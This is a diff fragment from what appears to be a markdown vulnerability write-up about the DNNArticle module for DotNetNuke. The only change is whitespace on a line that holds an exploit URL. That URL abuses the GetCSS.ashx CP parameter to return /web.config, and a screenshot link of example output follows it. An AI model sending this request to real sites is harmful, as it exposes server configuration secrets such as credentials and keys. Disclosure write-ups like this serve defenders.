@@ -33,7 +33,7 @@ After this report the company created a new concept to all  living beings, it he
 
 ``An attacker can simply replace the css file with /web.config this will litrally Get the contents of the web.config file and provide it to the attacker. this attack would look like this: ``
 
-       https://ISPfromMars.NotOM/desktopmodules/DNNArticle/GetCSS.ashx/?CP=/web.config&smid=512&portalid=3 
+         https://ISPfromMars.NotOM/desktopmodules/DNNArticle/GetCSS.ashx/?CP=/web.config&smid=512&portalid=3 
 #### Web.config example output:
 ![](https://www.msdigest.net/wp-content/uploads/2016/06/image_thumb-1.png)
 
